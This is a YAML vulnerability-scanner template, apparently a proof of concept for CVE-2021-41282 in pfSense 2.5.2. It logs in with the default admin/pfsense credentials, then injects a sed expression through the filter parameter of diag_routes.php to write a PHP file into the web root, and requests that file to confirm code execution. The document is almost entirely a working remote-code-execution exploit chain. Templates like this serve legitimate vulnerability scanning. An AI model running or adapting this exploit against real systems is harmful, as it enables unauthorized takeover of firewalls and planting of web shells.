name: yaml-poc-pfsense-pfsense-other-CVE-2021-41282
binding: d07c6536-fb0e-42a8-b279-a39a164187a5
detail:
    author: system_user
    links:
        - http://packetstormsecurity.com/files/166208/pfSense-2.5.2-Shell-Upload.html
        - https://cxsecurity.com/cveshow/CVE-2021-41282/
        - https://cxsecurity.com/issue/WLB-2022030023
        - https://docs.netgate.com/pfsense/en/latest/releases/22-01_2-6-0.html
        - https://packetstormsecurity.com/files/166208/pfSense-2.5.2-Shell-Upload.html
        - https://vigilance.fr/vulnerability/pfSense-code-execution-via-diag-routes-php-37559
        - https://www.cybersecurity-help.cz/vdb/SB2022022310
        - https://www.shielder.it/advisories/
        - https://www.shielder.it/advisories/pfsense-remote-command-execution/
    vulnerability:
        id: e053f56e-a15c-49e5-86ba-e27679709a0c
        level: high
transport: http
set:
    r1: randomInt(10000000, 20000000)
    rFilename: randomLowercase(6)
rules:
    r1:
        request:
            cache: true
            method: GET
            path: /index.php
            follow_redirects: false
        expression: response.status == 200
        output:
            search_csrfToken: '"(?P<csrfToken>sid:[a-z0-9,;:]+)".bsubmatch(response.body)'
            var_csrfToken: search_csrfToken["csrfToken"]
    r2:
        request:
            cache: true
            method: POST
            path: /index.php
            headers:
                Content-Type: application/x-www-form-urlencoded
            body: __csrf_magic={{var_csrfToken}}&usernamefld=admin&passwordfld=pfsense&login=Sign+In
            follow_redirects: false
        expression: 'response.status == 302 && response.raw_header.bcontains(b"Location: /")'
    r3:
        request:
            cache: true
            method: GET
            path: /diag_routes.php?isAjax=1&filter=.*/!d;};s/Destination/\x3c\x3fphp+var_dump(md5({{r1}}));unlink(__FILE__)\x3b\x3f\x3e/;w+/usr/local/www/{{rFilename}}.php%0a%23
            follow_redirects: false
        expression: response.status == 200
    r4:
        request:
            cache: true
            method: GET
            path: /{{rFilename}}.php
            follow_redirects: false
        expression: response.status == 200 && response.body.bcontains(bytes(md5(string(r1))))
expression: r1() && r2() && r3() && r4()
